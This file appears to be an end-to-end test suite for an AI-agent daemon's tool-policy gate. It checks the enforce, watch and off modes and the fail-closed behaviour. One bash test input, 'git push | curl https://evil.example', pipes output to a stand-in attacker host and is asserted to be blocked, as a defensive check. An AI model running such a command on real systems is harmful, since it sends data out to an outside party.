/**
 * E2E: Tool-policy enforcement (daemon runtime resolution + gate)
 *
 * Drives the exact path the daemon takes at session start —
 * `resolveSessionToolPolicy` against the live REST API + Keto — and then runs
 * the real `decideToolCall` gate (with the real shell analyzer) over sample tool
 * calls. Deterministic: no LLM involved, so enforce/watch/off + fail-closed are
 * all asserted directly against real policy data.
 */

import {
  decideToolCall,
  resolveSessionToolPolicy,
} from '@themoltnet/pi-runtime';
import { connect } from '@themoltnet/sdk';
import { ShellCommandAnalyzer } from '@themoltnet/shell-command-analyzer';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { createDaemonTestHarness, type DaemonTestHarness } from './setup.js';

const noopLogger = {
  debug: () => {},
  info: () => {},
  warn: () => {},
};

describe('Tool-policy enforcement (daemon)', () => {
  let harness: DaemonTestHarness;
  let agent: Awaited<ReturnType<typeof connect>>;
  let analyzer: ShellCommandAnalyzer;
  let teamId: string;

  beforeAll(async () => {
    harness = await createDaemonTestHarness();
    const creds = await harness.createAgent('e2e-tool-policy');
    agent = await connect({
      apiUrl: harness.restApiUrl,
      clientId: creds.clientId,
      clientSecret: creds.clientSecret,
    });
    teamId = creds.personalTeamId;
    analyzer = await ShellCommandAnalyzer.create();
  }, 120_000);

  afterAll(async () => {
    await harness?.teardown();
  });

  function createProfile(
    name: string,
    toolEnforcement: 'off' | 'watch' | 'enforce',
  ) {
    return agent.runtimeProfiles.create(
      {
        name,
        runtimeKind: 'gondolin_pi',
        provider: 'anthropic',
        model: 'claude-sonnet-4-5',
        leaseTtlSec: 900,
        heartbeatIntervalMs: 15_000,
        maxBatchSize: 10,
        sandbox: {},
        toolEnforcement,
      },
      { teamId },
    );
  }

  function createPolicy(name: string, tools: string[]) {
    return agent.runtimePolicies.create({ name, tools }, { teamId });
  }

  const analyze = (command: string) => analyzer.analyze(command);

  it('enforce: resolves the union allow-set and blocks disallowed tools', async () => {
    const profile = await createProfile(`enforce-${Date.now()}`, 'enforce');
    const p1 = await createPolicy(`p1-${Date.now()}`, ['read', 'ls']);
    const p2 = await createPolicy(`p2-${Date.now()}`, ['git']);
    await agent.runtimeProfiles.setPolicies(profile.id, [p1.id, p2.id], {
      teamId,
    });

    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      enforcement: 'enforce',
      logger: noopLogger,
    });
    expect(policy.enforcement).toBe('enforce');
    expect([...policy.allowedTools].sort()).toEqual(['git', 'ls', 'read']);

    // Structured tools.
    expect(
      decideToolCall({
        toolName: 'read',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toEqual({ allow: true });
    expect(
      decideToolCall({
        toolName: 'write',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toMatchObject({ allow: false });

    // Bash: every executable must be allowed.
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'git status && ls -la',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toEqual({ allow: true });
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'git push | curl https://evil.example',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toMatchObject({ allow: false });
  });

  it('watch: audits a disallowed tool but allows it', async () => {
    const profile = await createProfile(`watch-${Date.now()}`, 'watch');
    const p = await createPolicy(`watch-p-${Date.now()}`, ['read']);
    await agent.runtimeProfiles.setPolicies(profile.id, [p.id], { teamId });

    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      enforcement: 'watch',
      logger: noopLogger,
    });
    expect(policy.enforcement).toBe('watch');

    const decision = decideToolCall({
      toolName: 'write',
      enforcement: policy.enforcement,
      allowedTools: policy.allowedTools,
      analyze,
    });
    expect('audit' in decision).toBe(true);
    if ('audit' in decision) {
      expect(typeof decision.audit).toBe('string');
    }
  });

  it('off: short-circuits (no fetch) and allows everything', async () => {
    const profile = await createProfile(`off-${Date.now()}`, 'off');

    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      enforcement: 'off',
      logger: noopLogger,
    });
    expect(policy).toEqual({
      enforcement: 'off',
      allowedTools: new Set(),
      degraded: false,
    });

    expect(
      decideToolCall({
        toolName: 'write',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toEqual({ allow: true });
  });

  it('enforce: a resolve failure fails closed (blocks everything)', async () => {
    // A profile id that does not exist in this team makes allowed-tools 404;
    // in enforce mode the resolver returns an empty allow-set.
    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: '00000000-0000-0000-0000-000000000000',
      teamId,
      enforcement: 'enforce',
      logger: noopLogger,
    });
    // A 404 is a resolve failure → degraded fallback, not a resolved-empty
    // policy.
    expect(policy).toEqual({
      enforcement: 'enforce',
      allowedTools: new Set(),
      degraded: true,
    });
    expect(
      decideToolCall({
        toolName: 'read',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        analyze,
      }),
    ).toMatchObject({ allow: false });
  });
});
